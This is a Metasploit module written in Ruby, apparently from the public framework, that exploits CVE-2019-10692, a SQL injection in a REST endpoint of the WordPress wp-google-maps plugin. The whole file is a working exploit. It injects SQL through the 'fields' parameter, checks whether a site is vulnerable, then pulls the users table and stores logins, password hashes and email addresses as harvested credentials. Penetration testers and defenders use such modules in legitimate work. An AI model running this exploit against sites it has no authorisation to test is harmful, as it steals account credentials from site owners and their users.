##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(
      'Name'            => 'WordPress Google Maps Plugin SQL Injection',
      'Description'     => %q{
        This module exploits a SQL injection vulnerability in the a REST endpoint
        registered by the WordPress plugin wp-google-maps between 7.11.00 and
        7.11.17 (included).

        As the table prefix can be changed by administrators, set DB_PREFIX
        accordingly.
      },
      'Author'          =>
        [
          'Thomas Chauchefoin (Synacktiv)', # Vulnerability discovery, Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['CVE', '2019-10692'],
          ['WPVDB', '9249']
        ],
      'DisclosureDate'  => '2019-04-02'
    )

    register_options(
      [
        OptString.new('DB_PREFIX', [true, 'WordPress table prefix', 'wp_'])
      ])
  end

  def send_sql_request(sql_query)
    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path),
      'vars_get' => {
        'rest_route' => '/wpgmza/v1/markers',
        'filter' => '{}',
        'fields' => "#{sql_query}-- -",
      }
    )

    return nil if res.nil? || res.code != 200 || res.body.nil?
    res.body
  end

  def check
    mynum = "#{Rex::Text.rand_text_numeric(8..20)}"
    body = send_sql_request(mynum)
    return Exploit::CheckCode::Unknown if body.nil?
    return Exploit::CheckCode::Vulnerable if body.include?(mynum)

    Exploit::CheckCode::Unknown
  end

  def run
    print_status("#{peer} - Trying to retrieve the #{datastore['DB_PREFIX']}users table...")

    body = send_sql_request("* from #{datastore['DB_PREFIX']}users")
    fail_with(Failure::UnexpectedReply, 'No response or unexpected status code in response') if body.nil?

    begin
      body = JSON.parse(body)
    rescue JSON::ParserError
      fail_with(Failure::NotFound, 'Returned data is not in JSON format')
    end

    if body.empty?
      print_error("#{peer} - Failed to retrieve the table #{datastore['DB_PREFIX']}users")
    else
      loot = store_loot("wp_google_maps.json","application/json", rhost, body.to_s)
      print_good("Credentials saved in: #{loot}")
    end

    body.each do |user|
      print_good("#{peer} - Found #{user['user_login']} #{user['user_pass']} #{user['user_email']}")
      connection_details = {
        module_fullname: self.fullname,
        username: user['user_login'],
        private_data: user['user_pass'],
        private_type: :nonreplayable_hash,
        workspace_id: myworkspace_id,
        status: Metasploit::Model::Login::Status::UNTRIED,
        proof: user['user_email']
      }.merge(service_details)
      create_credential(connection_details)
    end
  end
end
